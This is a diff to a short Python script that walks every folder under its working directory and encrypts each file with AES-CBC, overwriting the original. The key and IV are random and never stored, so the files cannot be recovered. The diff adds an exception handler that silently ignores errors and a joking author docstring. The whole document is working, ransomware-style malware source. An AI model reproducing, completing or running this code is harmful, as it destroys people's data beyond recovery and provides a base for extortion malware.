@@ -1,16 +1,14 @@
-#import
-import os
-import sys
-from random import randint
+"""
+Im too good for life
+Made by nemo#3499
+"""
+import os,sys,random
 from Crypto.Cipher import AES 
-import random
-#start of code
-os.chdir("../")
 rootdir =  os.getcwd()# sets the directory to start from, later change this to where the program is stored
 key = ''.join(str(random.randint(0,9)) for _ in range(16))# sets the key
 iv = ''.join(str(random.randint(0,9)) for _ in range(16)) # sets the iv
-mode = AES.MODE_CBC #sets aes mode
-encryptor = AES.new(key, mode, IV=iv) # sets the main encryption function
+mode = AES.MODE_CBC #aes mode is CBC
+encryptor = AES.new(key, mode, IV=iv) # encrypt func
 for folder, subs, files in os.walk(rootdir): #os walk, recursive 
     if "main.py" in files:
         files.remove("main.py")
@@ -23,3 +21,5 @@ for folder, subs, files in os.walk(rootdir): #os walk, recursive
                  ciphertext = encryptor.encrypt(t) #encrypts the text
                  with open(os.path.join(folder, filename), 'wb') as tw: #allows the program to write to the file
                      tw.write(ciphertext) #overwrites the text
+                 except Exception as e:
+                     pass
